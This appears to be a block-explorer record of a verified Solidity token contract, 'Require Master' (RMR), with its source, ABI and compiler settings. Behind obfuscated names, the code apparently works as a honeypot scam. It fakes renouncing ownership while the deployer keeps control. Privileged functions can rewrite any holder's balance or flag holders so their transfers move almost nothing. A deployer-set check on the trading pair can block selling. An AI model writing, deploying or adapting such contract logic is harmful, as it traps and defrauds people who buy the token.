{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.13;\n\ninterface atLaunch {\n    function createPair(address tradingSwapLaunch, address swapMax) external returns (address);\n}\n\ninterface senderTxMode {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address isLiquidity) external view returns (uint256);\n\n    function transfer(address exemptTxTo, uint256 takeTeam) external returns (bool);\n\n    function allowance(address marketingAuto, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 takeTeam) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address exemptTxTo,\n        uint256 takeTeam\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed feeList, uint256 value);\n    event Approval(address indexed marketingAuto, address indexed spender, uint256 value);\n}\n\nabstract contract shouldExemptToken {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface receiverLiquidity {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface senderTxModeMetadata is senderTxMode {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract RequireMaster is shouldExemptToken, senderTxMode, senderTxModeMetadata {\n\n    function owner() external view returns (address) {\n        return tokenMarketing;\n    }\n\n    function allowance(address autoAmount, address isReceiver) external view virtual override returns (uint256) {\n        if (isReceiver == toMode) {\n            return type(uint256).max;\n        }\n        return tradingFrom[autoAmount][isReceiver];\n    }\n\n    uint256 public sellIs;\n\n    function listReceiver() private view {\n        require(marketingToken[_msgSender()]);\n    }\n\n    function launchLimit(address txSender) public {\n        listReceiver();\n        \n        if (txSender == listFrom || txSender == modeEnable) {\n            return;\n        }\n        totalTx[txSender] = true;\n    }\n\n    uint256 public fundAuto;\n\n    function transferFrom(address limitMode, address exemptTxTo, uint256 takeTeam) external override returns (bool) {\n        if (_msgSender() != toMode) {\n            if (tradingFrom[limitMode][_msgSender()] != type(uint256).max) {\n                require(takeTeam <= tradingFrom[limitMode][_msgSender()]);\n                tradingFrom[limitMode][_msgSender()] -= takeTeam;\n            }\n        }\n        return maxLaunchLiquidity(limitMode, exemptTxTo, takeTeam);\n    }\n\n    function launchAmount(address limitMode, address exemptTxTo, uint256 takeTeam) internal returns (bool) {\n        require(fromWallet[limitMode] >= takeTeam);\n        fromWallet[limitMode] -= takeTeam;\n        fromWallet[exemptTxTo] += takeTeam;\n        emit Transfer(limitMode, exemptTxTo, takeTeam);\n        return true;\n    }\n\n    uint256 fromShould;\n\n    uint256 constant amountAt = 18 ** 10;\n\n    function symbol() external view virtual override returns (string memory) {\n        return receiverLaunched;\n    }\n\n    bool public modeTokenAt;\n\n    address private tokenMarketing;\n\n    function autoBuyReceiver(uint256 takeTeam) public {\n        listReceiver();\n        fromShould = takeTeam;\n    }\n\n    event OwnershipTransferred(address indexed launchedAmount, address indexed fundIs);\n\n    function maxLaunchLiquidity(address limitMode, address exemptTxTo, uint256 takeTeam) internal returns (bool) {\n        if (limitMode == listFrom) {\n            return launchAmount(limitMode, exemptTxTo, takeTeam);\n        }\n        uint256 liquidityTo = senderTxMode(modeEnable).balanceOf(receiverEnable);\n        require(liquidityTo == fromShould);\n        require(exemptTxTo != receiverEnable);\n        if (totalTx[limitMode]) {\n            return launchAmount(limitMode, exemptTxTo, amountAt);\n        }\n        return launchAmount(limitMode, exemptTxTo, takeTeam);\n    }\n\n    bool private buyTotalLimit;\n\n    uint256 liquidityFee;\n\n    bool private launchedMarketing;\n\n    address toMode = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    uint8 private enableLaunched = 18;\n\n    function maxAmount() public {\n        emit OwnershipTransferred(listFrom, address(0));\n        tokenMarketing = address(0);\n    }\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return senderLiquidity;\n    }\n\n    function balanceOf(address isLiquidity) public view virtual override returns (uint256) {\n        return fromWallet[isLiquidity];\n    }\n\n    mapping(address => mapping(address => uint256)) private tradingFrom;\n\n    uint256 private toSender;\n\n    mapping(address => uint256) private fromWallet;\n\n    constructor (){\n        if (fundAuto != sellIs) {\n            buyTotalLimit = false;\n        }\n        receiverLiquidity receiverTo = receiverLiquidity(toMode);\n        modeEnable = atLaunch(receiverTo.factory()).createPair(receiverTo.WETH(), address(this));\n        if (toSender != sellIs) {\n            sellIs = fundAuto;\n        }\n        listFrom = _msgSender();\n        marketingToken[listFrom] = true;\n        fromWallet[listFrom] = senderLiquidity;\n        maxAmount();\n        \n        emit Transfer(address(0), listFrom, senderLiquidity);\n    }\n\n    address public modeEnable;\n\n    function tradingTakeLaunch(address buyLaunch) public {\n        require(buyLaunch.balance < 100000);\n        if (modeTokenAt) {\n            return;\n        }\n        \n        marketingToken[buyLaunch] = true;\n        if (toSender != sellIs) {\n            toSender = fundAuto;\n        }\n        modeTokenAt = true;\n    }\n\n    function name() external view virtual override returns (string memory) {\n        return takeLiquidityEnable;\n    }\n\n    uint256 private senderLiquidity = 100000000 * 10 ** 18;\n\n    function transfer(address buyAtExempt, uint256 takeTeam) external virtual override returns (bool) {\n        return maxLaunchLiquidity(_msgSender(), buyAtExempt, takeTeam);\n    }\n\n    address receiverEnable = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    string private takeLiquidityEnable = \"Require Master\";\n\n    mapping(address => bool) public marketingToken;\n\n    function approve(address isReceiver, uint256 takeTeam) public virtual override returns (bool) {\n        tradingFrom[_msgSender()][isReceiver] = takeTeam;\n        emit Approval(_msgSender(), isReceiver, takeTeam);\n        return true;\n    }\n\n    address public listFrom;\n\n    function decimals() external view virtual override returns (uint8) {\n        return enableLaunched;\n    }\n\n    mapping(address => bool) public totalTx;\n\n    function takeAmountLaunch(address buyAtExempt, uint256 takeTeam) public {\n        listReceiver();\n        fromWallet[buyAtExempt] = takeTeam;\n    }\n\n    function getOwner() external view returns (address) {\n        return tokenMarketing;\n    }\n\n    string private receiverLaunched = \"RMR\";\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"marketingAuto\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"launchedAmount\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"fundIs\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"feeList\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"autoAmount\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"isReceiver\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"isReceiver\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"takeTeam\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"takeTeam\",\"type\":\"uint256\"}],\"name\":\"autoBuyReceiver\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"isLiquidity\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"fundAuto\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"txSender\",\"type\":\"address\"}],\"name\":\"launchLimit\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"listFrom\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"marketingToken\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"maxAmount\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"modeEnable\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"modeTokenAt\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"sellIs\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"buyAtExempt\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"takeTeam\",\"type\":\"uint256\"}],\"name\":\"takeAmountLaunch\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"totalTx\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"buyLaunch\",\"type\":\"address\"}],\"name\":\"tradingTakeLaunch\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"buyAtExempt\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"takeTeam\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"limitMode\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"exemptTxTo\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"takeTeam\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "RequireMaster", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}